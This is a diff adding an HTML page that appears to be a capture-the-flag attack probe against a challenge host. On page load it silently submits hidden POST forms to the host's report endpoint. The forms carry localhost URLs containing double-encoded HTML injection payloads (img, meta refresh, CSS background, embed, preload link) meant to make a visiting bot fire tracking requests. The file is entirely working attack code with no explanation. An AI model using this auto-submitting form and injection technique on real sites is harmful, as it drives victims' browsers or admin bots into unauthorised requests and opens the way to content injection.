@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>report14</title></head>
+<body>
+<p>queueing reports 14</p>
+<script>
+const TARGET = 'http://k06749d7511f8df4bb76c71a2393a43af.playat.flagyard.com/?p=report';
+const base = 'http://127.0.0.1:5000/?p=view&dir=%253&file=';
+const Q = '%2522';
+const gt = '%253e';
+const urls = [
+  base + 'cimg%20src=/?p=trace%26id=botvisit4%26note=hello4%253e',
+  base + 'cmeta%20http-equiv=refresh%20content=' + Q + '0;url=/?p=trace%26id=metarefr1%26note=metaok' + Q + gt,
+  base + 'cstyle%253ebody{background-image:url(/?p=trace%26id=csstest1%26note=cssok)}',
+  base + 'cembed%20src=/?p=trace%26id=embedtst1%26note=embedok%253e',
+  base + 'clink%20rel=preload%20as=image%20href=/?p=trace%26id=preload1%26note=preok%253e'
+];
+urls.forEach(function (u, i) {
+  var iframe = document.createElement('iframe');
+  iframe.name = 'r' + i;
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = TARGET;
+  form.target = 'r' + i;
+  var input = document.createElement('input');
+  input.name = 'url';
+  input.value = u;
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
+});
+</script>
+</body>
+</html>
